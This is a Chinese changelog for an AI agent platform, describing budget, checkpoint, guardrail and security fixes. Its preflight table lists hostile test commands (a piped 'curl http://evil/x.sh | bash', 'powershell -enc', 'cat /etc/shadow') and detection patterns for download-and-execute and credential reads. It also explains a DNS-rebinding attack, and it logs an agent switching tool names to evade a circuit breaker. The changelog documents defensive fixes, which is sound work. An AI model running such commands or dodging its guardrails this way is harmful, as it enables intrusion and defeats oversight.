1. **会话 Token 预算把长任务硬中断**：默认预算派生自 `llm.max_tokens × 10` =
   81,920，而它是**跨任务累计、永不重置**的。实测一个"读取文件并复述"的普通
   任务就烧掉 43,459 token —— **一个会话大约只能跑两个任务**，之后每个新任务
   都在第一次模型调用时失败。长任务则在中途被掐死：每步 2.7k token 的任务在
   第 22 步抛 `RuntimeError`。
2. **中断时丢掉全部成果**：预算耗尽抛的是裸 `RuntimeError`，ReAct 循环里没有
   任何地方接得住 —— 一路浮成 HTTP 500，已有的部分交付机制根本轮不到执行。
3. **检查点只写不读**：全项目只在**任务跑完后**写一次检查点，而
   `resume_from_checkpoint` 会把计划丢掉、**从头重跑**。所谓断点续跑并不存在。
4. **取消任务会遗弃子进程**：`terminal` 只在超时时才 kill，点"停止"则径直穿过；
   而且杀的是 `cmd.exe`，真正的命令作为孙进程被留下继续跑。

### 修复 — Token 预算：按任务重置 + 与 `max_tokens` 解耦 + 优雅收尾

- **按任务重置**（收益最大）：`_run_impl_bound` 开头重置已用量。此前
  `ResourceManager` 只在 Agent 构造与会话克隆时各建一次，而 Web 端同一会话的
  多轮任务复用同一个克隆实例，于是预算跨任务累计。实测把"会话可用任务数"
  从 **1 个**提升到**不受限**。
- **与 `max_tokens` 解耦**：新增 `execution.task_token_budget`（默认 500,000）。
  `max_tokens` 是"单次回复长度上限"，与"一个任务能烧多少"无关，绑在一起会让
  调回复长度顺带改掉任务预算。原派生值 81,920 还有个自相矛盾之处：产品自带的
  smoke 套件给单任务设的断言上限是 **120,000** —— 出厂默认下那个断言**永远
  不可能满足**，说明这个数从来不是有意的成本策略。设 0 可回退旧行为。
- **优雅收尾**：新增 `BudgetExhaustedError`（而不再是裸 `RuntimeError`），
  ReAct 循环就地接住、`break` 走**已有的部分交付清单**路径。实测从
  "第 31 步崩溃、零交付"变成"跑满上限 + 交出部分交付清单"。
  Plan 路径与计划后的收尾步骤（TDD 闭环 / 质量评估 / 反思）同样加了降级：
  预算没了就跳过评估，而不是把手里的结果一起丢掉。

### 修复 — 检查点：按步落盘 + 真正续跑

- **按步落盘**：`agent._maybe_checkpoint()` 在 ReAct 的每个动作后、计划路径的
  每个步骤后写一次（最小间隔 15 秒节流，避免长任务把磁盘写爆）。落盘改为
  **先写临时文件再替换**的原子写 —— 按步保存后被杀很可能留下半截 JSON。
- **真续跑**：`resume_from_checkpoint` 此前把存下来的计划整个丢掉，用一句
  "继续执行此前未完成的任务：…"从头重跑 —— 跑了两小时只差最后一步的任务会被
  整个重做。现在恢复原计划、已完成的目标保持 `COMPLETED`（执行器自己跳过），
  只跑剩下的。为此把"执行已有计划"从 `_run_plan_execute` 拆成 `_execute_plan`。
- **配套**：检查点 id 补毫秒（原先秒级时间戳，同一秒两次保存会静默覆盖）；
  落盘后按 `prune(max_checkpoints=20)` 定期裁剪（`prune()` 此前**零调用方**，
  检查点会无限增长）；新增 `latest_for_session()` 与 `list_resumable()`
  （列出没跑完的检查点，供重启后提示 —— 刻意**不自动续跑**，那要花真钱）。
- `_agent_state.session_id` 此前从未被赋值，检查点文件名里的 id 与真实会话对不上；
  现在按会话写入。

### 修复 — 取消任务：杀掉整棵进程树

- `terminal` 新增 `except asyncio.CancelledError` 与 `finally` 兜底，**任何退出
  路径都不再留下孤儿进程**；
- 杀进程改为 `taskkill /F /T`（Windows）与 `killpg`（POSIX）—— **杀树而不只是
  杀 shell**。实测：只 kill shell 时，`python -c "time.sleep(60)"` 作为孙进程
  会继续留在进程表里；
- 沙箱子进程同样处理：`asyncio.to_thread` 被取消时线程被丢弃、`Popen` 却还活着。
  新增 `_ChildHolder` 跨线程交接句柄，取消时按句柄杀（含"取消先于进程创建到达"
  的时序）。

### 修复 — 护栏不再能被"每步换个招数"绕过

实测日志里模型依次尝试 `terminal` → `cmd /c …` → `execute_shell_command` →
`ask_user` → `python_sandbox`：熔断确实触发了，但**任务没有停**，一路烧到预算耗尽。
原因是两条护栏都只看形状：

- **熔断按工具名计数** → 换个名字就重新计数；
- **无进展检测只与紧邻的上一个动作比较** → `A,B,A,B…` 每一步都把 streak 重置。

现在：

- 无进展检测增加**滑动窗口**判据（最近 6 步内同一动作指纹出现 3 次即介入），
  交替循环无处可藏；同一动作只提示一次，第二次直接拦截（窗口滑动会让计数
  稳定停在阈值上，只看计数就永远只提示、从不拦截）；
- 新增**结果导向**的硬护栏 `NO_SUCCESS_LIMIT`：连续 5 轮没有任何一次工具调用
  成功即提前收尾。它与模型换了多少种花样无关。

### 改进 — 工具调用成功率

实测里工具调用失败的**最大来源**是"名字凭记忆拼写"与"路径写错范围"，而这两件事
系统提示与工具 schema 此前**一个字都没说**。

- **工具名归一化提前到主循环**，先于任何判断执行。`tools/base.py` 其实早就有
  `resolve_name()` 模糊匹配，但它只在 `dispatch()` 里生效 —— 权限门控
  （`react_executor._gate`）与计划取工具（`plan_executor._get_tool`）都用精确匹配，
  于是 `read_file` 被判成"工具不存在"，再按 SENSITIVE 去要审批，**而同一个名字在
  dispatch 里其实能正常执行**。归一化同时让熔断记账、事件推送用上同一个真名，
  不再出现"同一工具两条失败记录、熔断永远攒不到阈值"。
- **解析不出来的工具名按 `DANGEROUS` 处理**。此前是 `SENSITIVE`，比 `terminal`
  还温和；`plan_executor` 对同一情形用的是 `DANGEROUS`，两处口径现已一致。
- **计划路径的"工具不存在"消息带上建议**。`base.unknown_tool_error()` 早就备好了
  "你是不是想用 XXX"，却从没被调用过 —— 用户只看到一句"工具「X」不存在"。
- **沙箱白名单补上纯计算模块**：`hashlib` / `zlib` / `struct` / `base64` /
  `binascii` / `operator` / `bisect` / `heapq` / `array` / `pprint` 等 15 个。
  实测日志里连续三次失败正是 `禁止导入 'hashlib' / 'zlib' / 'struct'` ——
  校验和、压缩、二进制解析是编码任务的日常动作，它们既不碰文件也不碰网络。
  **仍然刻意排除**（安全姿态不变）：`io` / `codecs`（把 `open` 重新暴露成
  `io.open`）、`gzip` / `tarfile` / `zipfile`（可按路径直接打开文件）、
  `pathlib` / `uuid` / `random`（持有 `_os` 私有别名）。
- **沙箱的拒绝消息告知"什么行"**。此前只有 `禁止导入 'hashlib'` —— 说清了不行，
  没说清什么行，模型只能一个模块一个模块地猜，每次失败都白烧一轮迭代、还给
  熔断器记上一笔。现在错误与工具 schema 里都列出完整白名单（约 250 字符）。
- **路径语义写进系统提示与 schema**：所有文件路径相对项目根解析，优先用相对路径
  （如 `src/app.py`）；`terminal.workdir` 标注"必须已存在，省略即用项目根"。
- **越界消息统一并说清基准**：以前同一个错误有两套话术
  （`路径越界：…解析到允许范围之外` 与 `path 超出项目目录范围`），都**没说基准
  目录在哪**。现在共用 `_RootGuard.out_of_scope_message()`，给出允许的根目录与
  正确写法。
- **`terminal` 预校验 `workdir`**：目录不可用时在 Windows 上只会抛裸的
  `[WinError 5] 拒绝访问。`，既没说哪个目录、也没说怎么办。现在直接说明
  "该目录不可用 + 请省略 workdir 或改传已存在的相对路径"，并把 spawn 阶段的
  常见 errno 翻译成可执行指引。
- **历史折叠改为头 + 尾保留**（与当前轮裁剪口径一致）。此前只留头部，而工具输出
  最有价值的信息常在结尾：测试失败汇总、编译器报错行、非零退出的原因、
  大文件读取的最后几行。丢掉这些等于让模型"记得读过、却不记得读出了什么"。

### 修复 — 推理模型的空回复不再被当成"成功"

配置里的 `deepseek-flash` 是推理模型，`reasoning_content` 与 `content` **共用**
`max_tokens`（实测最坏一轮 reasoning 占掉 **69.6%**）。一旦预算被 reasoning 用光，
`content` 为空、`finish_reason="length"`，而 ReAct 只看"有没有 tool_calls"，
于是把**空输出判成任务完成**。

现在：空正文或被截断的回复不算完成，会带着说明重试（最多 3 次），
之后以 `stop_reason="empty_response"` 收尾并给出部分交付清单。`finish_reason`
这个字段此前被记录、却从未被任何执行路径读取。

### 修复 — 配置项名不副实

- `execution.llm_call_timeout_seconds` 此前**在 `ExecutionConfig` 里根本不存在**，
  而 `agent.py` 一直在读它 —— `getattr` 的默认值 300s 恒定生效，用户怎么改都没用。
  现在显式定义出来。
- `execution.max_task_seconds` 默认 0 = **整轮任务没有任何墙钟上限**，与那条
  "理论上一跑四小时"的注释自相矛盾（保护默认是关的）。默认改为 1800 秒。
- `execution.retry_delay_seconds` 此前**没有任何读取方**，而重试循环是"连打三次、
  中间零延迟"。现在真的接到重试上，并复用 `RetryHandler` 的指数退避 + 抖动 ——
  那个模块（177 行，"指数退避 + 熔断器"）此前**全项目只有测试引用**，
  等于一份从没生效过的文档承诺。新增 `RetryHandler.sleep_before_retry()`。
- LLM 层：**429 改为退避重试**（限流是典型瞬时错误，直接中止会让长任务被打断），
  退避从线性改成指数 + 抖动；重试耗尽时不再抛 `LLMProviderNotFoundError`
  （那会让排障方向跑偏去查 provider 名字），改抛带具体原因的 `LLMError`。

### 修复 — 三处计费/统计不准

- **失败任务不上报 token**：异常与超时分支直接返回空用量，于是失败任务的 token
  一律记成 0。实测 smoke 套件真实消耗约 35 万 token，报告里只显示 10.5 万。
  现在异常路径也取用量，并补了一条从 `ResourceManager` 兜底取数的路径。
- **价格表缺 `deepseek-flash`**：它既不在表里、前缀也匹配不上，于是落到
  fallback（$3/$15，Opus 档）—— 实测同一笔用量被算成 $0.8357，按真实价率只有
  $0.1290，**高估 6.48 倍**。已补入表；模型不在表里时报告会明确提示
  "这是 fallback 估价，可能与账单相差数倍"。
- **额度退还从未生效**：`quota.refund_task()` 此前**零调用者**，那句"任务未真正
  开始时退还额度"的文档承诺从未兑现 —— "没配 API Key"这类秒失败也会吃掉社区版
  100 次/天里的一次。现在 HTTP 与 WebSocket 两条失败路径都会退还，判据用
  "累计用量为 0"（而不是匹配异常文案，文案一改就会静默失效）。

### 其它修复

- **会话淘汰不再掐断正在跑的任务**：LRU 淘汰到上限（默认 32）时会 `close()` 掉
  最旧的克隆，从而关掉它独享的 LLM 客户端 —— 若那个会话的任务还在飞行中，
  表现是"任务毫无征兆地报连接错误"。现在淘汰时跳过正在跑的会话；全都在跑时
  宁可暂时超限。
- **两处会误导人的死代码已标注**：`ContextManager.should_compress()` 与
  `MemoryManager.compress_context()` 都没有调用方，而它们看起来像"长任务的
  上下文保护"。真正生效的是 `ReActExecutor.compact()`。文档已如实说明。
- **`output_budget` 的文档与行为不符**：原文写"把 `tool_output_max_chars` 设为 0
  即原样下发"，实际 `tool_output_max_tokens` 那道夹取仍然生效（最坏仍截到
  21000 字符）。按它调参的人会以为自己关掉了截断，实际只关掉了一半。
- **计划步骤重试的失败原因**不再被一句 `Failed after N attempts` 盖掉。

### 新增回归用例

- `tests/planning/test_budget_recovery.py`（20 条）：预算重置、解耦、优雅收尾、
  接线检查。
- `tests/planning/test_tool_reliability.py`（21 条）：交替循环识别、工具跳变收尾、
  空回复不算成功、工具名归一化先于门控、沙箱白名单与可操作错误、路径语义与
  越界消息、**取消任务真的杀掉子进程**（真起进程验证）。
- `tests/planning/test_agent_clone_parity.py`（4 条）：会话克隆与 `__init__` 的
  属性一致性 —— 见下面那条修复的由来。

### 修复 — 会话克隆漏同步属性，导致 Web 端每次跑任务都失败

上面「按步落盘」写完后，Web 端**每次跑任务**都会报：

```
'AutoMindAgent' object has no attribute '_last_checkpoint_at'
```

根因不在检查点本身，而在 `clone_for_session()` 的构造方式：它用
`object.__new__(type(self))` 造克隆、**不经过 `__init__`**，属性靠一份
**手工维护的清单**逐个复制。往 `__init__` 加字段时漏了同步，就得到一个
只在"按会话跑任务"时才会出现的 `AttributeError`。

**它躲过了当时的全部验证**，原因很具体：评测器每个用例都**新建** agent
（`AutoMindExecutor` 的文档就写着「每个任务建一个独立的 AutoMindAgent」），
根本不走克隆路径；单测里也没有任何一条比对过克隆的完整性。
**测试路径与线上路径不同，是这类漏项最典型的藏身处。**

修法分三层：

1. **补上漏掉的字段**：`_last_checkpoint_at` / `_checkpoint_saves`
   （按会话独享）与 `builtin_tool_names`（只读，改为共享）；
2. **旁路不许拖垮主流程**：`_maybe_checkpoint()` 整体包进 try，
   节流状态改用 `getattr(..., 默认值)` 读取 —— 检查点是尽力而为的旁路，
   任何失败（含属性缺失、磁盘满、状态不可序列化）都只能记一条日志；
3. **让这类漏项不可能再发生**：新增
   `tests/planning/test_agent_clone_parity.py`，**自动比对** `__init__` 设过的
   属性与克隆上的属性。它立刻又抓出两个既有漏项：

   - `_verify_state`：收尾时 `if self._verify_state:` 会读它，而它只在
     `_autonomy_closure` 里被赋值 —— **对话模式下克隆会话每次收尾都会抛
     `AttributeError`**，被外层 `except` 吞成一条 `run_summary_emit_failed`，
     整条 run_summary 观测事件静默消失（不报错、也不可见）；
   - `_task_deadline`：目前靠"别处一定会先赋值"侥幸不炸，但那是脆弱契约。

   三条都已补齐。

> `object.__new__` + 手工清单这种写法值得警惕：新用例的价值不在于它现在通过，
> 而在于**以后往 `__init__` 加字段时它会立刻变红**。

### 修复 — 「测试连接」失败时什么都不说（`连接失败（）`）

线上现象：

```
❌ 连接失败（）
ApiError: 请求超时（20000ms 内没有响应）
```

括号是空的 —— 排查定位到**三处各自独立的缺陷**，叠在一起就把原因全丢了：

**1. 后端的超时提示从来没被命中过（最隐蔽的一条）**

```python
elif "connect" in low or "timeout" in low or ...:      # ← 判据写的是 "timeout"
    hint = "无法连接到服务地址，请检查 api_base 与网络/代理。"
```

而 SDK 真正抛出的是 `APITimeoutError: Request timed out.` —— 里面是
**"timed out"（带空格）**，**不含 "timeout" 这个子串**。于是最常见的那类
失败恰好一条提示都拿不到，`hint` 恒为空串。

- 超时判据**提到最前面**，并覆盖 `timed out` / `timeout` / `ReadTimeout` /
  `APITimeoutError` / `deadline exceeded` / `connect error` 等写法；
- 提示里带上**实际等待秒数与本次上限**（`等待 12 秒未收到响应（本次上限 12 秒）`），
  并点明"推理类模型首字延迟明显更长，可先换非推理模型验证连通性"；
- 响应新增 `elapsed_s` / `timeout_s`，前端据此显示「后端等待 Ns」。

**2. 前端的 `stage` 从未被设置**

客户端兜底超时的 `catch` 分支只给了 `error`，没给 `stage`，界面便渲染成
`连接失败（）`。现在该分支会填 `stage: 'no-response'` 与可操作提示，
并说明"**这不是模型慢，是后端没答**"，列出启动中 / 防火墙 / 代理劫持回环
三种常见原因。界面也改成 stage 为空时不渲染空括号。

**3. 前端那句"友好文案"是死代码**

```ts
error: e?.name === 'AbortError' ? '测试连接超时（20 秒无响应）…' : String(e)
```

`apiPost()` 内部已经把浏览器的 `AbortError` 转成了 `ApiError(408)`，
所以 `e.name` 是 `'ApiError'` —— 这个条件**永远为假**，用户实际看到的一直是
`String(e)`。现在改为判 `e instanceof ApiError && e.status === 408`。

**顺带把前端兜底超时从 20s 提到 45s**：后端自己的等待上限是 12s，
前端只等 20s 意味着"后端稍微慢一点，前端就先放弃"，用户永远看不到后端本可以
给出的具体原因（网络？Key？模型名？）。45s = 12s + 启动/排队余量，
**诊断权始终留在后端手里**。

> 一并重建了前端产物，资源路径由 `dist/*.js` 变为 `dist/assets/*.js` ——
> 这反而修好了一个打包问题：`pyproject.toml` 的 package-data 一直是
> `static/dist/assets/*`，而旧产物是扁平放在 `dist/` 根下的，
> **pip 安装后 JS 根本不会随包分发**。

### 与 1.7.4 的行为差异（升级须知）

| 配置项 | 旧默认 | 新默认 | 说明 |
|---|---|---|---|
| `execution.task_token_budget` | 不存在（派生 81,920） | `500000` | 设 0 回退旧派生值 |
| `execution.max_task_seconds` | `0`（不限） | `1800` | 设 0 恢复不限 |
| `execution.retry_delay_seconds` | 无读取方 | 真正生效 | 重试之间的退避基数 |

长任务的成本会相应上升（原来被掐死的任务现在会跑完）。这是有意的取舍：
用 +13% 的真实成本换来"任务真的做完并且交出成果"。若需严格控制成本，
请下调 `task_token_budget`，并**同批**收紧 `react_no_progress_limit` 等护栏。

## [1.7.4] - 2026-09-18

**三处"看起来在防、其实没接上"的地方**

这一版继续沿着 1.7.3 的主线走：把承诺与代码对齐。三处都有一个共同特征 ——
**测试全绿、界面正常、文档写着有防护**，而防护本身从未生效。

### 安全 — DNS 重绑定：判定"这是本机"的依据从 IP 换成 Host

服务默认绑回环（`127.0.0.1`），此前据此认为"回环 == 本机用户"，并把管理动作
（改 `api_base` / 加 MCP / 加载插件 = 任意代码 / 触发更新）、目录浏览、
`/api/integrations/continue`（会吐明文令牌）都挂在这个判断上。

**这个推理有一个反例**：攻击者让自己的域名先解析到自己的服务器（页面正常
跑起来，Origin = 攻击者域名），TTL 归零后改成 `127.0.0.1`。浏览器再请求时
**TCP 连的是本机、`Host` 却仍是攻击者域名** —— 于是 `request.client.host`
是回环，上面每一项信任全部成立。而管理动作里那些 `POST` 是"简单请求"，
浏览器不发预检，CORS 拦不住它们**已经生效**：`api_base` 一改，此后每次对话的
提示词与 API Key 都从攻击者的地址过。

- **判据换成本次请求的 `Host` 头**（浏览器自己按 URL 填，重绑定场景下必然是
  攻击者的域名，伪造不了）：回环的各种写法（`localhost`、`127.0.0.1`、
  `[::1]`、`127.0.0.0/8`、带端口、带尾点）正常放行；
- **在令牌判定之前执行，且按整站判**（不只 `/api/`）—— 只保护 `/api/` 是漏的：
  重绑定页面能先把**首页与其前端脚本**取回去，再由脚本去调 `/api`；
- **逃生门**：反代 / 内网域名 / 隧道场景设 `AUTOMIND_TRUSTED_HOSTS`
  （逗号分隔，支持 `*.example.com`）；403 文案里直接写明怎么放行，
  不留一个没有出路的报错；
- 绑 `0.0.0.0` 时不做 Host 判定 —— 那种部署 Host 只能是外部名字，
  按 Host 拦会把正常用法全拦掉，准入交给 `auth_token`。

### 修复 — 自动更新的 SHA256 校验从未生效（发布侧与更新侧各写各的文件名）

`updater` 的三重校验里，"防篡改/防损坏"那一层要求从 Release 的
`SHA256SUMS` 资产里取基线，而发布脚本产出的名字是 `SHA256SUMS.txt`：

```python
_SUMS_ASSET = "SHA256SUMS"        # updater 找的
$sumFile = "dist\desktop\SHA256SUMS.txt"   # release_github.ps1 产出的
```

两侧名字对不上 → `asset_sha256` 恒为空 → `_verify_integrity()` 每次都走
`"未提供校验和，跳过"` 这条分支。字节数与 Authenticode 签名还在校验，
所以**一切看起来都正常** —— 只有哈希这一层是空的，而文档与界面都在说"三重校验"。

- 发布脚本改为产出官方名字 `SHA256SUMS`，且**文件里只放校验和行**（注释行会让
  `sha256sum -c` 报格式错误，用户照着做反而得到"校验失败"）；说明性文字移入
  新增的 `RELEASE-INFO.txt`；
- `updater` 同时认 `SHA256SUMS` 与 `SHA256SUMS.txt`，**已发布的旧版本不再失校**
  （优先官方名，缺了才退到 `.txt`）；
- 顺带修掉解析器对文本模式换行（`\r\n`）与 `sha256sum -c` 两种行格式
  （`hash␠␠name` / `hash *name`）的容忍度 —— 这类"有校验和却校验不上"的
  症状排起来极费时间。

### 修复 — 环境探测的 `PermissionError` 会把"探不到"变成"起不来"

`EnvironmentDetector._check_command()` 只捕获 `FileNotFoundError` 与
`TimeoutExpired`，漏了同属 `OSError` 的 `PermissionError`：

- Windows 上把**目录**放进 `PATH` 时 `CreateProcess` 抛
  `PermissionError(WinError 5)`；
- 受限令牌（应用容器 / 杀软拦截）同样抛 `PermissionError`。

而这个调用发生在 `AutoMindAgent.__init__` 里 —— 抛出去就是**构造 Agent 失败**：
界面白屏、任务全挂，根因却只是"环境里有个命令探不到"。探活函数的契约是
回答"能不能用"（不能用 = `False`），不是把异常往上扔。

- 改为捕获整个 `OSError`；`TimeoutExpired` 不是 `OSError` 子类，单独列出；
- 探活失败**绝不返回 True** —— 那会让上层以为工具可用，然后在更远的地方炸；
- 补了"整个环境里一个命令都起不来时 `detect()` 仍要给出结果"的用例。

### 验证

- 全量回归：`pytest tests/ -q`（本机 700+ 用例全绿）、`ruff check .` 零告警；
- 新增用例：`tests/test_http_guard.py`、`tests/server/test_host_guard_wiring.py`
  （Host 判定**真的挂在请求链路上**，而不是只测函数）、
  `tests/test_env_detector_robustness.py`、`tests/test_updater.py` 的校验和接线组；
- 桌面三平台安装包（Windows 签名版 / macOS 通用 DMG / Linux deb）随本版一并发布，
  并在 Release 里附上 `SHA256SUMS` 与 `RELEASE-INFO.txt`。

## [1.7.3] - 2026-09-17

**接线版本：把"写了但没通电"的六个环节接上，并补上交付真正缺的四件事**

这一版的主线不是"加功能"，而是**让已有的东西真的生效**。一次完整审计（四个分区、
逐条带行号取证）找出的最严重问题不是"少了什么"，而是**好几处防护与治理写得
很完整、却从未被调用**：预算链路空转、危险命令靠前缀放行、密钥能被 Web 端点直读、
管理动作与只读动作同权、指标一个都没有。下面每一处都附了"怎么发现的"与
"怎么保证它以后不再退化"。

### 修复 — Token 预算整条链路空转（记错字段名，异常被吞）

预算这条链路上每一环都写好了：`_pre_call` 准入 → 80% 推预警并压缩上下文 →
100% 拒绝本次调用 → `ResourceManager` 记账。**但记账那一环写错了字段名**：

```python
rm.tokens.tokens_used.prompt += ...        # TokenUsage 里没有 .prompt
rm.tokens.tokens_used.completion += ...    # 也没有 .completion
```

每次 LLM 调用都在这里抛 `AttributeError`，又被紧跟的 `except Exception` 吞成一条
warning。后果不是"少记一点"，而是**整条链路空转**：`usage_fraction()` 恒为 0 →
80% 预警永不触发 → 预算驱动的上下文压缩永不执行 → 100% 拒绝永不生效。
账单与上下文双双无上限，界面上 token 数字却照常跳动（那是另一个口径）。

最阴的是**测试是绿的**：原有用例直接往 `TokenUsage` 上设了**正确**的字段名，
测的是"如果字段名对了会怎样"，而生产代码走的是另一条路。

- **🧮 收敛到单一写入点** `TokenCounter.track_usage()`：同类错误以后再犯会在测试里
  立刻暴露，而不用去猜字段名。
- **🧪 新用例从真实用量回调灌数据**（`tests/core/test_token_budget_chain.py`），
  覆盖记账、累计、预警、去重告警、超额拒绝、正常不误报。
- **🛡 加了一道 AST 静态护栏**：全仓再出现 `tokens_used.prompt/.completion`
  这种属性访问就直接红 —— 动态用例只能证明"测到的那条路是对的"，而这类错误
  **恰恰出现在没被测到的那条路上**（它就是这样活到 1.7.2 的）。

### 安全 — 链式危险命令不再靠"安全前缀"免检

`preflight` 此前对**整串**命令做一次前缀匹配，于是：

| 命令 | 旧行为 | 现在 |
|---|---|---|
| `echo hi && curl http://evil/x.sh \| bash` | **allow**(risk=50) | ask |
| `ls; powershell -enc SQBFAFgA` | **allow** | ask |
| `cat /etc/shadow` | **allow** | ask |
| `ls -la` / `git status` | allow | allow（未误伤） |

根因不是"漏了几个正则"，而是**前缀匹配对可任意拼接的 shell 语言从根上不成立**：
只要在危险动作前垫一个无害命令，整串就被判成安全 —— 而这正是提示注入最自然的写法。

- **✂️ 按连接符拆段、逐段定级、取最严**（`&&` `||` `;` `|` `&` 换行 `$()` 反引号）。
- **🔍 新增整串形态判据**：下载即执行（`| bash`/`| python`）、编码混淆
  （`-enc`/`iex`/`FromBase64String`）、白名单程序被拿来下载执行
  （`certutil`/`mshta`/`rundll32`）、读系统凭据文件（`/etc/shadow`、`.ssh/`）。
- **🗣 新增 `explain_command()`**：把"拆成了几段、每段什么等级"摊开给审批弹窗与
  审计看 —— 只给一个总等级，用户没法判断"为什么要问我"。
- 日常命令（`ls -la && git status`、`grep -rn`、`cat README.md`）保持自动放行，
  否则用户第一件事就是把审批关掉。

### 安全 — 平台密钥与数据不再能被 Web 端点直读

Web 侧的文件端点只校验"路径在不在 project_root 之内"，而**默认 project_root
就是启动目录** —— 平台的密钥与数据恰好躺在那里，且是明文：

```
GET /api/files/read?path=.automind_config.json   → 全部提供商 API Key
GET /api/files/read?path=.automind/automind.db   → 全部会话历史
POST /api/files/write {path: ".automind_config.json", ...}
                                                 → 改成攻击者的 api_base，
                                                   此后每次对话的提示词都被导走
```

- **🚧 新增 `automind/core/sensitive.py`**：按**路径分量**判定（不是子串匹配，
  `my.automind/notes.md` 不会被误伤），并分两级粒度：
  - **Web 端点（编辑器/预览/diff）**：平台密钥 + 用户凭据文件（`.env`、`.ssh`、
    `.aws`、`*.pem`…）一律不给读 —— 这些端点没有读凭据的正当用途；
  - **Agent 的文件工具**：只挡**平台自身**的密钥与数据目录。用户项目里的 `.env`
    不挡 —— 读项目文件是 Agent 的本职，"帮我看看 .env 缺哪项"是正常任务；
  - 拒绝信息里写明逃生门 `AUTOMIND_ALLOW_SENSITIVE_FILE_READ=1`，
    不给用户一个没有出路的 403。

### 安全 — 管理动作与只读/执行动作分权

此前**任何**持有访问令牌的人都能：改 `api_base`（把模型出口指向攻击者，此后
每一次对话的提示词与 API Key 都从那儿过）、加 MCP 服务器（= 以本进程身份启动
任意进程）、加载插件/技能（= 任意代码）、触发静默更新、`DELETE /api/audit`
抹掉审计。而访问令牌的本意只是"让前端 / IDE 连上来聊天跑任务"。

- **🔑 新增管理员令牌** `AUTOMIND_ADMIN_TOKEN` + 请求头 `X-Admin-Token`：
  - 本机回环访问 = 管理台（桌面版与"我就在这台机器上开浏览器"不受影响）；
  - 远程访问：配了管理员令牌则必须带对；**没配则一律拒绝**并写明怎么开；
  - fail-closed：不能"没配就放行"—— 那等于安全策略在**默认配置**下失效。
- **📋 集中一张管理端点表**（配置 / MCP / 插件 / 技能 / 更新 / 工具开关 /
  工作区 / 专家 / 团队 / 回滚 / 知识库写 / **审批回执** / **工作流** / **评测**）：
  判定放在中间件里而不是逐个端点加装饰器 —— 135 个端点漏一个就是漏洞，
  而漏掉那种情况不会有任何测试告诉你。只拦变更方法，GET 一律不受影响。
- **🔒 令牌比较改为常量时间**（`secrets.compare_digest`）。
- **🖥 界面支持**：设置 → Agent 集成 里可填入管理员令牌（存本浏览器，
  服务端不保存）—— 否则"从另一台机器打开界面改设置"会被 403 挡住而无处输入。

### 新增 — 可观测性：`/metrics` 与真就绪探针

此前全仓 **0 处** `prometheus`/`otel`；`/api/health` 无论数据库打不开、磁盘满了
还是 LLM 没配，都返回 `status: ok`，编排系统据此把流量导进来。

- **📊 `GET /metrics`**（Prometheus 文本格式，**零新依赖**）：任务数（按终态）、
  任务耗时直方图（**固定桶**，长跑实例不会因为记指标而吃内存）、工具调用（按工具
  与结果）、审批三态、中途插话三态、预算事件、token 用量、webhook 投递账目、
  工作流与评测计数；配置令牌时同样受保护（scraper 用 `?token=`）。
- **🏥 `GET /api/health/ready`**：真的去碰依赖 —— 数据目录可写、SQLite 可读写、
  项目目录可写、磁盘余量；任一关键项不可用 → **503**。LLM 未配置**不算不就绪**
  （界面与配置功能仍可用，把它记成就绪失败会让刚部署的实例被反复重启）。
- **🪝 打点挂在唯一的事件漏斗上**（`observability.record()`）：服务端与 agent 的
  全部事件都经过它，覆盖率与事件覆盖率天然一致 —— 在别处逐个打点意味着
  "新增一条终态路径就漏一个指标"。
- **🧼 标签值清洗与截断**：指标是长期存储且常被多人查看，不允许把任务原文
  塞进标签（那是数据出口，不是监控）。

### 新增 — 连接器 SDK：不改源码就能接客户系统

此前要接"客户内部 HTTP API / 工单系统"只能 fork `agent.py` 的注册表，或写一个
MCP server —— 而 MCP 的 SSE 传输**不支持认证头**，多半接不上。

- **🔌 `~/.automind/connectors/*.py` 自动发现**（`AUTOMIND_CONNECTORS_DIR` 可改，
  多目录用 `os.pathsep` 分隔）：放一个文件进去，里面的 `AbstractTool` 子类就会
  出现在模型的可选工具里。
- **♻️ `POST /api/tools/reload`**：现场写完连接器立刻生效，不用重启服务。
- **🧯 失败绝不静默**：坏文件进 `load_failures()`（含"缺依赖 httpx：pip install
  httpx"这类可照抄的提示）→ 并进 `/api/tools/registration` 与任务前自检；
  一个文件坏掉不连累其余；符号链接越界拒绝执行并记账。
- **🧰 模板与文档**：`examples/05-connector-development/`（可跑的工单查询连接器 +
  端到端自检脚本）、`docs/CONNECTORS.md`（schema 写法、权限档决策表、常见坑）。

### 新增 — 评测框架与可重放轨迹

全仓此前**没有任何评测集**（grep golden/eval 零命中），也**无法重放**：现有轨迹
是取证用的，字段被截断到 4000 字符且脱敏 —— 它证明"发生了什么"，但重建不了
"模型当时收到的确切输入"。结果：买方无法验收，改了提示词也不知道有没有退化。

- **🎬 可重放轨迹**（`automind/core/replay.py`）：每次 LLM 调用记一行 JSON，
  含**未截断的 messages + tools + 参数 + 响应 + 用量 + 耗时**；默认关闭
  （`AUTOMIND_REPLAY=1` 或配置开启，关闭时零成本），写入前过滤密钥，
  有体积上限与轮转。
- **⏯ 重放 CLI**：`python -m automind.core.replay <file.replay.jsonl> [--dry-run]`
  —— 按记录重新请求模型，逐条报告文本相似度、工具调用集合是否一致、用量差异。
- **📋 评测框架**（`automind/eval/`）：YAML 套件 + 7 类断言（`contains` /
  `not_contains` / `regex` / `file_exists` / `tool_called` / `max_seconds` /
  `max_tokens`），执行器**可注入**（离线可测），报告含通过率、逐任务明细、
  耗时、token 与估算成本。
- **🚦 退出码会说人话**：0 全过 / 1 有未通过 / 2 配置问题（**无 Key 时明确报
  "无法评测"，绝不当成"全部失败"或"全部通过"**）/ 3 中断。
- **📦 内置冒烟套件**随包分发（7 任务 / 31 断言，含一条反向断言给框架自己做体检）。

### 新增 — 出站事件与外部审批

此前所有状态只能"人来轮询"；审批更是只能在 Web 弹窗里点，客户要求"在工单系统里批"
做不到。

- **📣 Webhook**（`automind/core/webhooks.py`）：任务开始/完成/失败/取消 +
  审批请求/超时/裁决，投递到配置的 URL（`AUTOMIND_WEBHOOKS`，多个目标）；
  `X-AutoMind-Signature: sha256=<hmac>` 签名、指数退避重试、单请求超时、
  有界队列（满则丢弃 + 计数 + warning）、**绝不阻塞任务**。
- **✅ 外部审批回执** `POST /api/approvals/{approval_id}`：客户系统可在自己的
  工单/群里批准。**三重把关**：属于管理动作（远程必须带管理员令牌）、
  迟到回执明确 409 `approval_stale`（不静默丢弃）、**拒绝时参数强制置空**
  （否则只读 `modified` 的调用点会把"拒绝 + 参数"误判成"改后批准"）。
- **🧾 载荷只发摘要**：任务 500 字符、参数 200 字符/20 键、密钥打码 ——
